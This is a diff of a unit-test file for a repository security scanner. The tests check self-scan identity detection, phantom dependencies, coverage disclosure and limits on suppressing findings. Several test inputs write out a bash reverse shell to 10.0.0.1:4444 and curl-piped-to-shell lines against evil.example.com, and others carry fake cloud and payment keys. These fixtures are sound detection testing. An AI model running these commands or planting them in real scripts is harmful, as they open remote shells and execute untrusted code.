@@ -36,6 +36,9 @@ def make_rule_id(category, message):
 
 
 EVAL_RULE_ID = make_rule_id("EXECUTION", "eval() \u2014 executes arbitrary code")
+# A MEDIUM finding used by suppression tests, since the P2 trust cap allows target config to
+# suppress only LOW/MEDIUM non-secret findings (HIGH like eval can no longer be suppressed).
+RMTREE_RULE_ID = make_rule_id("FILESYSTEM", "shutil.rmtree() \u2014 recursive directory deletion")
 
 # Fake Stripe key assembled at runtime — split to avoid triggering git secret scanning
 _FAKE_STRIPE = "sk_live_" + "A" * 24
@@ -1225,19 +1228,21 @@ class TestEvasionDetection(unittest.TestCase):
 class TestInlineSuppression(unittest.TestCase):
 
     def test_suppression_skips_finding(self):
-        report = scan_repo({"app.py": "eval(x)  # gatekeeper: ignore\n"})
-        eval_f = [f for f in report.findings if f.verified and "eval()" in f.message]
-        self.assertEqual(len(eval_f), 0, "Suppressed eval should not be flagged")
+        # Uses a MEDIUM finding: the P2 trust cap allows target-supplied suppression only for
+        # LOW/MEDIUM non-secret findings (a HIGH like eval can no longer be inline-suppressed).
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"})
+        f = [x for x in report.findings if x.verified and "rmtree" in x.message]
+        self.assertEqual(len(f), 0, "Suppressed MEDIUM finding should not be flagged")
 
     def test_suppression_js_style(self):
-        report = scan_repo({"app.js": "eval(x); // gatekeeper: ignore\n"})
-        eval_f = [f for f in report.findings if f.verified and "eval()" in f.message]
-        self.assertEqual(len(eval_f), 0, "JS-style suppression should work")
+        report = scan_repo({"app.js": "document.write(x); // gatekeeper: ignore\n"})
+        f = [x for x in report.findings if x.verified and "document.write" in x.message]
+        self.assertEqual(len(f), 0, "JS-style suppression should work")
 
     def test_suppression_case_insensitive(self):
-        report = scan_repo({"app.py": "eval(x)  # GATEKEEPER: IGNORE\n"})
-        eval_f = [f for f in report.findings if f.verified and "eval()" in f.message]
-        self.assertEqual(len(eval_f), 0, "Case-insensitive suppression should work")
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # GATEKEEPER: IGNORE\n"})
+        f = [x for x in report.findings if x.verified and "rmtree" in x.message]
+        self.assertEqual(len(f), 0, "Case-insensitive suppression should work")
 
     def test_suppression_does_not_suppress_secrets(self):
         d = create_test_repo({"config.py": f'API_KEY = "{_FAKE_STRIPE}"  # gatekeeper: ignore\n'})
@@ -1320,9 +1325,10 @@ class TestTrustModel(unittest.TestCase):
             shutil.rmtree(d, ignore_errors=True)
 
     def test_trusted_allows_suppression(self):
-        report = scan_repo({"app.py": "eval(x)  # gatekeeper: ignore\n"})
-        eval_f = [f for f in report.findings if f.verified and "eval()" in f.message]
-        self.assertEqual(len(eval_f), 0, "Trusted (local) scan should honor suppression")
+        # MEDIUM finding: only LOW/MEDIUM non-secret findings are suppressible under the cap.
+        report = scan_repo({"app.py": "shutil.rmtree(x)  # gatekeeper: ignore\n"})
+        f = [x for x in report.findings if x.verified and "rmtree" in x.message]
+        self.assertEqual(len(f), 0, "Trusted (local) scan should honor suppression")
 
 
 # ============================================================================
@@ -1545,21 +1551,22 @@ class TestProjectConfig(unittest.TestCase):
             shutil.rmtree(d, ignore_errors=True)
 
     def test_gatekeeper_json_suppress_rule(self):
-        """Project config suppress should dismiss specific rule+file combos."""
+        """Project config suppress should dismiss specific rule+file combos (MEDIUM only:
+        under the P2 trust cap, target config cannot suppress HIGH/CRITICAL/SECRET)."""
         d = create_test_repo({
             ".gatekeeper.json": json.dumps({
-                "suppress": [{"rule": EVAL_RULE_ID, "files": ["build.py"], "reason": "Build requires eval"}]
+                "suppress": [{"rule": RMTREE_RULE_ID, "files": ["build.py"], "reason": "Build cleans dirs"}]
             }),
-            "build.py": "eval(config_str)\n",
-            "app.py": "eval(user_input)\n",
+            "build.py": "shutil.rmtree(config_dir)\n",
+            "app.py": "shutil.rmtree(user_dir)\n",
         })
         try:
             scanner = SecurityScanner(skip_deps=True)
             report = scanner.scan(d)
-            build_eval = [f for f in report.findings if f.verified and "eval()" in f.message and "build.py" in f.file]
-            app_eval = [f for f in report.findings if f.verified and "eval()" in f.message and "app.py" in f.file]
-            self.assertEqual(len(build_eval), 0, "Suppressed rule+file should be dismissed")
-            self.assertGreater(len(app_eval), 0, "Non-suppressed file should still be flagged")
+            build_f = [f for f in report.findings if f.verified and "rmtree" in f.message and "build.py" in f.file]
+            app_f = [f for f in report.findings if f.verified and "rmtree" in f.message and "app.py" in f.file]
+            self.assertEqual(len(build_f), 0, "Suppressed rule+file should be dismissed")
+            self.assertGreater(len(app_f), 0, "Non-suppressed file should still be flagged")
         finally:
             shutil.rmtree(d, ignore_errors=True)
 
@@ -3172,13 +3179,19 @@ class TestOptionalDepsPrompt(unittest.TestCase):
     def _run(self, args, tty=True, marker_home=None, answer="n"):
         """Run the prompt with a forced-missing dep, capturing stdout.
         buf.isatty is set explicitly because redirect_stdout makes sys.stdout
-        the buffer, and the function calls sys.stdout.isatty()."""
+        the buffer, and the function calls sys.stdout.isatty().
+
+        Marker isolation patches HOME (POSIX) and USERPROFILE (Windows) because
+        os.path.expanduser('~') reads USERPROFILE on Windows, not HOME. subprocess.run
+        is stubbed so the install branch can never spawn a real pip on any platform."""
         buf = io.StringIO()
         buf.isatty = lambda: tty
+        marker_env = {"HOME": marker_home, "USERPROFILE": marker_home} if marker_home else {}
         with mock.patch.object(core_mod, "_missing_optional_deps", return_value=self.FAKE_DEP), \
-             mock.patch.dict(os.environ, {"HOME": marker_home} if marker_home else {}, clear=False), \
+             mock.patch.dict(os.environ, marker_env, clear=False), \
              mock.patch("sys.stdin.isatty", return_value=tty), \
              mock.patch("builtins.input", return_value=answer), \
+             mock.patch.object(core_mod.subprocess, "run", return_value=None), \
              contextlib.redirect_stdout(buf):
             core_mod._prompt_optional_deps(args)
         return buf.getvalue()
@@ -3212,6 +3225,703 @@ class TestOptionalDepsPrompt(unittest.TestCase):
                 json.dump(["yara-python"], f)
             out = self._run(self._args(), tty=True, marker_home=d, answer="y")
             self.assertEqual(out, "")  # already prompted → silent
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+# ============================================================================
+# 28. P0 Defect Regression Tests
+# ============================================================================
+
+class TestSelfDetectionIdentity(unittest.TestCase):
+    """Defects 1 and 2: self-detection must be identity-based (sentinel marker),
+    not filename-based. A third-party repo that merely contains a file named
+    core.py or patterns.py keeps full scrutiny."""
+
+    SENTINEL = "gatekeeper-self-identity-marker-v1-do-not-remove"
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    def test_third_party_core_py_finding_survives(self):
+        """A finding inside a file named core.py is NOT dismissed when the target
+        is not Gatekeeper (no sentinel marker present)."""
+        d = self._make({"gatekeeper_scanner/core.py": 'X = "eval("\n'})
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertFalse(scanner._scanning_self)
+            msgs = [f.message for f in report.findings if f.file.endswith("core.py")]
+            self.assertTrue(any("eval()" in m for m in msgs),
+                            "eval finding in a third-party core.py must survive")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_third_party_core_py_signature_survives(self):
+        """A YARA SIGNATURE finding inside a file named core.py is NOT dismissed for a
+        non-self target. Old code dropped any SIGNATURE finding in a scanner-named file."""
+        d = self._make({
+            "gatekeeper_scanner/core.py": 'CMD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n',
+        })
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertFalse(scanner._scanning_self)
+            sigs = [f for f in report.findings if f.category == "SIGNATURE"]
+            if not sigs:
+                self.skipTest("YARA engine unavailable in this environment; SIGNATURE path not exercised")
+            self.assertTrue(sigs, "SIGNATURE finding in a third-party core.py must survive")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_self_scan_still_dismisses_pattern_definition(self):
+        """With the sentinel marker present (a real self-scan) the same detector-code
+        string literal IS dismissed, so legitimate suppression is preserved."""
+        d = self._make({
+            "gatekeeper_scanner/core.py": 'MARK = "%s"\nX = "eval("\n' % self.SENTINEL,
+        })
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertTrue(scanner._scanning_self)
+            verified = [f.message for f in report.findings if f.file.endswith("core.py")]
+            self.assertFalse(any("eval()" in m for m in verified),
+                             "detector-code string must be dismissed on a real self-scan")
+            dismissed = [f for f in report._all_findings
+                         if f.file.endswith("core.py") and not f.verified and "eval()" in f.message]
+            self.assertTrue(dismissed, "eval finding should be present but dismissed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_third_party_git_history_secret_survives(self):
+        """A real leaked secret in git history is NOT dismissed just because the repo
+        contains a scanner-named file (patterns.py)."""
+        d = tempfile.mkdtemp()
+
+        def git(*a):
+            subprocess.run(["git", "-C", d, *a], capture_output=True)
+
+        subprocess.run(["git", "init", d], capture_output=True)
+        git("config", "user.email", "t@t.com")
+        git("config", "user.name", "T")
+        try:
+            with open(os.path.join(d, "patterns.py"), "w") as f:
+                f.write("import os\nos.system(cmd)\n")
+            secret = os.path.join(d, "config.env")
+            with open(secret, "w") as f:
+                f.write("AWS_KEY=" + "AKIA" + "IOSFODNN7EXAMPLE" + "\n")
+            git("add", "-A")
+            git("commit", "-m", "add config")
+            os.remove(secret)
+            git("add", "-A")
+            git("commit", "-m", "remove config")
+
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertFalse(scanner._scanning_self)
+            history = [f for f in report.findings
+                       if f.file == ".git/history" and f.category == "SECRET"]
+            self.assertTrue(history, "git-history secret must survive in a third-party repo")
+            self.assertNotEqual(report.grade, "A",
+                                "grade must reflect the leaked-secret finding")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_detect_self_scan_requires_marker(self):
+        """_detect_self_scan is True only when the sentinel marker is present."""
+        no_mark = self._make({"gatekeeper_scanner/core.py": "print('hi')\n"})
+        with_mark = self._make({"gatekeeper_scanner/core.py": 'M = "%s"\n' % self.SENTINEL})
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            self.assertFalse(scanner._detect_self_scan(no_mark))
+            self.assertTrue(scanner._detect_self_scan(with_mark))
+        finally:
+            shutil.rmtree(no_mark, ignore_errors=True)
+            shutil.rmtree(with_mark, ignore_errors=True)
+
+
+class TestPhantomDepAttribution(unittest.TestCase):
+    """Defect 3: each ecosystem emits only its own phantom deps, attributed to the
+    correct source manifest. No cross-attribution between Python and JS."""
+
+    def _scan(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        try:
+            return SecurityScanner(skip_deps=False).scan(d)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def _phantoms(self, report):
+        return sorted(
+            (f.file, f.message) for f in report.findings
+            if f.category == "DEPENDENCY" and "Phantom dependency" in f.message
+        )
+
+    def test_no_cross_attribution_python_and_js(self):
+        report = self._scan({
+            "requirements.txt": "pyfoo==1.0.0\n",
+            "app.py": "print('hello')\n",
+            "package.json": '{"name":"x","version":"1.0.0","dependencies":{"jsbar":"1.0.0"}}',
+            "index.js": "console.log('hello')\n",
+        })
+        self.assertEqual(self._phantoms(report), [
+            ("package.json", "Phantom dependency: 'jsbar' declared but never imported"),
+            ("requirements.txt", "Phantom dependency: 'pyfoo' declared but never imported"),
+        ])
+
+    def test_pyproject_phantom_attributed_to_pyproject(self):
+        report = self._scan({
+            "pyproject.toml": '[project]\nname = "x"\nversion = "1.0.0"\ndependencies = ["pybaz"]\n',
+            "app.py": "print('hello')\n",
+        })
+        self.assertEqual(self._phantoms(report), [
+            ("pyproject.toml", "Phantom dependency: 'pybaz' declared but never imported"),
+        ])
+
+    def test_js_phantom_not_masked_by_many_python_phantoms(self):
+        """C2c: 11 Python phantom deps must not hide the JS phantom via the [:10] slice
+        on the shared list. The JS phantom must still emit under package.json."""
+        reqs = "".join(f"pyfoo{i}==1.0.0\n" for i in range(11))
+        report = self._scan({
+            "requirements.txt": reqs,
+            "app.py": "print('hello')\n",
+            "package.json": '{"name":"x","version":"1.0.0","dependencies":{"jsonlyphantom":"1.0.0"}}',
+            "index.js": "console.log('hello')\n",
+        })
+        js = [f for f in report.findings
+              if f.category == "DEPENDENCY" and "jsonlyphantom" in f.message]
+        self.assertTrue(js, "JS phantom must emit even with 11 Python phantom deps present")
+        self.assertEqual(js[0].file, "package.json")
+
+
+class TestCoverageDisclosure(unittest.TestCase):
+    """Defect 5 + C3: oversized files and over-length lines are recorded as coverage
+    gaps in the report dict AND surfaced in terminal output and SARIF via the warning
+    plumbing. Disclosure only: the letter grade must not change."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    def test_gaps_recorded_grade_unchanged_and_disclosed(self):
+        base = {"app.py": "def f():\n    return 1\n", "util.py": "def g():\n    return 2\n"}
+        withgaps = dict(base)
+        withgaps["big.py"] = "x = 1\n" * 120000               # about 720KB, over the 500KB limit
+        withgaps["minified.py"] = 'data = "' + "A" * 3000 + '"\n'  # one line over 2000 chars
+
+        d1 = self._make(base)
+        d2 = self._make(withgaps)
+        try:
+            base_report = SecurityScanner(skip_deps=True).scan(d1)
+            gap_report = SecurityScanner(skip_deps=True).scan(d2)
+
+            reasons = {g["reason"] for g in gap_report.coverage_gaps}
+            self.assertIn("file_exceeds_500KB", reasons)
+            self.assertTrue(any("lines_exceed_2000_chars" in r for r in reasons))
+            self.assertEqual(base_report.grade, gap_report.grade,
+                             "coverage gaps must not change the letter grade")
+
+            # terminal: coverage gaps surface through the WARNINGS section
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                ReportPrinter(use_color=False).print_report(gap_report, warnings=gap_report.warnings)
+            out = buf.getvalue()
+            self.assertIn("over 500KB", out)
+            self.assertIn("over 2000 chars", out)
+
+            # SARIF: coverage gaps surface as execution notifications, not as results
+            sarif = generate_sarif(gap_report)
+            notes = " ".join(
+                n["message"]["text"]
+                for n in sarif["runs"][0]["invocations"][0]["toolExecutionNotifications"]
+            )
+            self.assertIn("over 500KB", notes)
+            self.assertIn("over 2000 chars", notes)
+            # disclosure must not leak into gradeable SARIF results
+            self.assertFalse(any("over 500KB" in r["message"]["text"] for r in sarif["runs"][0]["results"]))
+        finally:
+            shutil.rmtree(d1, ignore_errors=True)
+            shutil.rmtree(d2, ignore_errors=True)
+
+    def test_clean_repo_has_no_coverage_warning(self):
+        """A repo with nothing skipped records no gaps and emits no coverage warning."""
+        report = scan_repo({"app.py": "print('clean')\n"})
+        self.assertEqual(report.coverage_gaps, [])
+        self.assertFalse(any("Coverage:" in w for w in report.warnings))
+
+    def test_coverage_gap_paths_are_relative(self):
+        """File-size and long-line gaps both use repo-relative paths, not absolute ones."""
+        d = self._make({
+            "sub/big.py": "x = 1\n" * 120000,
+            "minified.py": 'data = "' + "A" * 3000 + '"\n',
+            "app.py": "print('hi')\n",
+        })
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(report.coverage_gaps)
+            for g in report.coverage_gaps:
+                self.assertFalse(os.path.isabs(g["path"]),
+                                 f"coverage gap path should be relative: {g['path']}")
+            size_gap = [g for g in report.coverage_gaps if g["reason"] == "file_exceeds_500KB"]
+            self.assertEqual(size_gap[0]["path"], os.path.join("sub", "big.py"))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestSmallCorrections(unittest.TestCase):
+    """C5a (zsh pipe), C5b (unquoted real secret), C6 (--skip-deps disclosure)."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    def test_curl_pipe_zsh_flagged(self):
+        """C5a: 'curl ... | zsh' must be caught like sh/bash. Old regex (?:ba)?sh missed zsh."""
+        d = self._make({"install.sh": "#!/bin/sh\ncurl http://evil.example.com/x | zsh\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            piped = [f for f in report.findings if "piped to shell" in f.message]
+            self.assertTrue(piped, "curl piped to zsh must be flagged")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_unquoted_db_url_real_creds_flagged(self):
+        """C5b: an unquoted real credential must not be dismissed because the username
+        looks like a placeholder ('myuser'). Old placeholder heuristic dropped it."""
+        d = self._make({"config.txt": "DATABASE_URL = postgres://myuser:R3alP4ssw0rd123@db.host.com:5432/prod\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            secrets = [f for f in report.findings if f.category == "SECRET"]
+            self.assertTrue(secrets, "real DB credential must be flagged, not dismissed as placeholder")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_placeholder_creds_still_dismissed(self):
+        """Guard: obvious placeholder creds (admin:admin) stay dismissed after the fix."""
+        d = self._make({"config.txt": "DB = postgres://admin:admin@localhost/db\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            secrets = [f for f in report.findings if f.category == "SECRET"]
+            self.assertEqual(secrets, [], "admin:admin is a placeholder and must stay dismissed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_skip_deps_disclosed(self):
+        """C6: --skip-deps must be disclosed in the report and printed in the header."""
+        d = self._make({"app.py": "print('hi')\n", "requirements.txt": "flask==2.3.0\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue(any("skip-deps" in c for c in report.disabled_checks),
+                            "disabled_checks must record --skip-deps")
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                ReportPrinter(use_color=False).print_report(report, warnings=report.warnings)
+            self.assertIn("Disabled:", buf.getvalue())
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_no_skip_deps_no_disclosure(self):
+        """A full scan (no disabled checks) shows no Disabled line."""
+        report = scan_repo({"app.py": "print('hi')\n"}, skip_deps=False)
+        self.assertEqual(report.disabled_checks, [])
+
+
+class TestCodexRound3(unittest.TestCase):
+    """Codex adversarial review fixes: exact-basename self-detection, git-history
+    placeholder-by-commit-message, placeholder substring FN, self-scan DoS hardening."""
+
+    SENTINEL = "gatekeeper-self-identity-marker-v1-do-not-remove"
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    def test_lookalike_filename_not_suppressed_during_self_scan(self):
+        """R3-1: a file named malicious_core.py must NOT be suppressed by endswith on
+        core.py, even when a real self-scan is in progress (sentinel present)."""
+        d = self._make({
+            "gatekeeper_scanner/core.py": 'M = "%s"\n' % self.SENTINEL,
+            "malicious_core.py": 'X = "eval("\n',
+        })
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertTrue(scanner._scanning_self)
+            evil = [f.message for f in report.findings if f.file.endswith("malicious_core.py")]
+            self.assertTrue(any("eval()" in m for m in evil),
+                            "lookalike filename must keep full scrutiny even during a self-scan")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_git_history_secret_not_dismissed_by_commit_message(self):
+        """R3-2: a real leaked secret in history must survive even when a commit message
+        contains a placeholder word like 'example'."""
+        d = tempfile.mkdtemp()
+
+        def git(*a):
+            subprocess.run(["git", "-C", d, *a], capture_output=True)
+
+        subprocess.run(["git", "init", d], capture_output=True)
+        git("config", "user.email", "t@t.com")
+        git("config", "user.name", "T")
+        try:
+            with open(os.path.join(d, "cfg.env"), "w") as f:
+                f.write("AWS_KEY=" + "AKIA" + "IOSFODNN7EXAMPLE" + "\n")
+            git("add", "-A")
+            git("commit", "-m", "example config")   # placeholder word in the commit message
+            os.remove(os.path.join(d, "cfg.env"))
+            git("add", "-A")
+            git("commit", "-m", "remove")
+            report = SecurityScanner(skip_deps=True).scan(d)
+            hist = [f for f in report.findings if f.file == ".git/history" and f.category == "SECRET"]
+            self.assertTrue(hist, "history secret must survive a placeholder word in the commit message")
+            self.assertNotEqual(report.grade, "A")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_real_secret_with_placeholder_substring_survives(self):
+        """R3-3: a valid-format secret whose value merely CONTAINS 'example' as an
+        internal substring must NOT be dismissed."""
+        d = self._make({"config.txt": "TOKEN = " + "sk_live_" + "AAAAAAAAAAAAAexampleBBBBBBBBBBBB\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue([f for f in report.findings if f.category == "SECRET"],
+                            "secret containing 'example' as an internal substring must survive")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_whole_value_placeholder_still_dismissed(self):
+        """R3-3 guard: a value that IS a placeholder (all X's) still dismisses."""
+        d = self._make({"config.txt": 'API_KEY = "' + "sk_live_" + 'XXXXXXXXXXXXXXXXXXXXXXXX"\n'})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertEqual([f for f in report.findings if f.category == "SECRET"], [],
+                             "a whole-value placeholder must still be dismissed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    @unittest.skipUnless(os.path.exists("/dev/zero") and hasattr(os, "symlink"),
+                         "needs /dev/zero and symlink support")
+    def test_self_scan_detection_ignores_special_files(self):
+        """R3-4: a core.py symlinked to /dev/zero must not hang or fake a self-scan."""
+        d = tempfile.mkdtemp()
+        os.makedirs(os.path.join(d, "gatekeeper_scanner"))
+        os.symlink("/dev/zero", os.path.join(d, "gatekeeper_scanner", "core.py"))
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            # Completes (no hang) and does not falsely trigger self-scan.
+            self.assertFalse(scanner._detect_self_scan(d))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestCodexP1(unittest.TestCase):
+    """P1 batch: narrowed+disclosed self-scan suppression (F1b), target-config trust cap
+    (F2b), coverage breadth beyond the extension whitelist (F3), phantom cap never silent
+    and never hides a suspicious dep (F5)."""
+
+    SENTINEL = "gatekeeper-self-identity-marker-v1-do-not-remove"
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "w") as f:
+                f.write(content)
+        return d
+
+    # ---- F1b ----
+    def test_signature_in_non_definition_file_not_suppressed_during_self_scan(self):
+        """A YARA SIGNATURE reverse-shell in reporter.py (a scanner file but NOT a signature
+        definition file) is NOT suppressed even during a self-scan."""
+        d = self._make({
+            "gatekeeper_scanner/core.py": 'M = "%s"\n' % self.SENTINEL,
+            "reporter.py": 'CMD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n',
+        })
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertTrue(scanner._scanning_self)
+            sigs = [f for f in report.findings if f.category == "SIGNATURE" and f.file.endswith("reporter.py")]
+            if not sigs and not any(f.category == "SIGNATURE" for f in scanner.findings):
+                self.skipTest("YARA engine unavailable in this environment")
+            self.assertTrue(sigs, "SIGNATURE in a non-definition scanner file must survive a self-scan")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_self_scan_discloses_suppression_in_terminal_and_sarif(self):
+        """When self-identifying, one disclosure warning is emitted and reaches terminal + SARIF."""
+        d = self._make({"gatekeeper_scanner/core.py": 'M = "%s"\n' % self.SENTINEL})
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            report = scanner.scan(d)
+            self.assertTrue(scanner._scanning_self)
+            hits = [w for w in report.warnings if "self-identifies as Gatekeeper" in w]
+            self.assertEqual(len(hits), 1, "disclosure must fire exactly once per scan")
+            sarif = generate_sarif(report)
+            notes = " ".join(n["message"]["text"]
+                             for n in sarif["runs"][0]["invocations"][0]["toolExecutionNotifications"])
+            self.assertIn("self-identifies as Gatekeeper", notes)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- F2b ----
+    def _rule_id_of(self, report, predicate):
+        for f in report.findings:
+            if predicate(f):
+                return f.rule_id
+        return None
+
+    def test_target_config_cannot_suppress_secret_or_critical(self):
+        """A target .gatekeeper.json may not suppress a SECRET or a CRITICAL finding."""
+        files = {
+            "app.py": "import subprocess\nsubprocess.run(cmd, shell=True)\n",
+            "config.txt": "AWS_KEY=" + "AKIA" + "BCDEFGHIJKLMNOP1" + "\n",
+        }
+        d = self._make(files)
+        try:
+            base = SecurityScanner(skip_deps=True).scan(d)
+            secret_rule = self._rule_id_of(base, lambda f: f.category == "SECRET")
+            crit_rule = self._rule_id_of(base, lambda f: f.severity == "CRITICAL")
+            self.assertTrue(secret_rule and crit_rule, "need a SECRET and a CRITICAL to test")
+            with open(os.path.join(d, ".gatekeeper.json"), "w") as f:
+                json.dump({"suppress": [
+                    {"rule": secret_rule, "files": ["*"], "reason": "x"},
+                    {"rule": crit_rule, "files": ["*"], "reason": "x"},
+                ]}, f)
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertTrue([f for f in r.findings if f.category == "SECRET"],
+                            "target config must not suppress a SECRET")
+            self.assertTrue([f for f in r.findings if f.severity == "CRITICAL"],
+                            "target config must not suppress a CRITICAL")
+            self.assertTrue(any("cannot silence" in w for w in r.warnings))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_target_config_can_still_suppress_medium_non_secret(self):
+        """Legit noise tuning still works: a MEDIUM non-secret finding can be suppressed."""
+        d = self._make({"app.py": "compile(src)\n"})
+        try:
+            base = SecurityScanner(skip_deps=True).scan(d)
+            med_rule = self._rule_id_of(
+                base, lambda f: f.severity == "MEDIUM" and f.category != "SECRET")
+            if not med_rule:
+                self.skipTest("no MEDIUM non-secret finding to suppress")
+            with open(os.path.join(d, ".gatekeeper.json"), "w") as f:
+                json.dump({"suppress": [{"rule": med_rule, "files": ["*"], "reason": "x"}]}, f)
+            r = SecurityScanner(skip_deps=True).scan(d)
+            self.assertFalse([f for f in r.findings if f.rule_id == med_rule],
+                             "a MEDIUM non-secret suppression should still work")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_inline_ignore_cannot_suppress_critical(self):
+        """Inline '# gatekeeper: ignore' may quiet MEDIUM noise but never a CRITICAL. Uses a
+        line-based curl|sh CRITICAL (not the multiline subprocess pattern) to isolate the
+        inline-ignore path."""
+        d = self._make({
+            "install.sh": "#!/bin/sh\ncurl http://evil.example.com/x | sh  # gatekeeper: ignore\n",
+            "a.py": "compile(src)  # gatekeeper: ignore\n",
+        })
+        try:
+            r = SecurityScanner(skip_deps=True).scan(d)   # local dir is auto-trusted
+            msgs = [f.message for f in r.findings]
+            self.assertTrue(any("piped to shell" in m for m in msgs),
+                            "inline ignore must not hide a CRITICAL")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- F3 ----
+    def test_oversize_dockerfile_and_pem_disclosed_image_excluded(self):
+        """Coverage disclosure covers categorized-scannable files beyond the extension
+        whitelist (extensionless Dockerfile, .pem) but excludes images."""
+        d = self._make({"app.py": "print('hi')\n"})
+        with open(os.path.join(d, "Dockerfile"), "w") as f:
+            f.write("FROM x\nRUN curl http://e.sh | sh\n" + ("# pad\n" * 90000))
+        with open(os.path.join(d, "key.pem"), "w") as f:
+            f.write("-----BEGIN RSA PRIVATE KEY-----\n" + ("A" * 600000))
+        with open(os.path.join(d, "img.png"), "w") as f:
+            f.write("X" * 600000)
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            paths = {g["path"] for g in report.coverage_gaps if g["reason"] == "file_exceeds_500KB"}
+            self.assertIn("Dockerfile", paths)
+            self.assertIn("key.pem", paths)
+            self.assertNotIn("img.png", paths)
+            sarif = generate_sarif(report)
+            notes = " ".join(n["message"]["text"]
+                             for n in sarif["runs"][0]["invocations"][0]["toolExecutionNotifications"])
+            self.assertIn("over 500KB", notes)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    # ---- F5 ----
+    def test_suspicious_phantom_bypasses_cap_and_overflow_disclosed(self):
+        """With more phantoms than the display cap, a suspicious one still emits and the
+        overflow is disclosed (the [:10] slice can never silently drop the malicious one)."""
+        deps = {f"ordphantom{i}": "1.0.0" for i in range(12)}
+        deps["crossenv"] = "1.0.0"   # on the JS suspicious-package list
+        d = self._make({
+            "index.js": "console.log(1)\n",
+            "package.json": json.dumps({"name": "x", "version": "1.0.0", "dependencies": deps}),
+        })
+        try:
+            report = SecurityScanner(skip_deps=False).scan(d)
+            phantoms = [f.message for f in report.findings
+                        if f.category == "DEPENDENCY" and "Phantom dependency" in f.message]
+            self.assertTrue(any("'crossenv'" in m for m in phantoms),
+                            "a suspicious phantom must bypass the display cap")
+            self.assertTrue(any("additional phantom" in w for w in report.warnings),
+                            "phantom overflow must be disclosed, never silent")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestCodexP2(unittest.TestCase):
+    """P2 round: complete the target-config trust cap (HIGH/CRITICAL/SECRET never
+    suppressible via any lever, exclusions disclosed, weights clamped) + forge precision,
+    SVG coverage, and named phantom overflow."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            p = os.path.join(d, name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
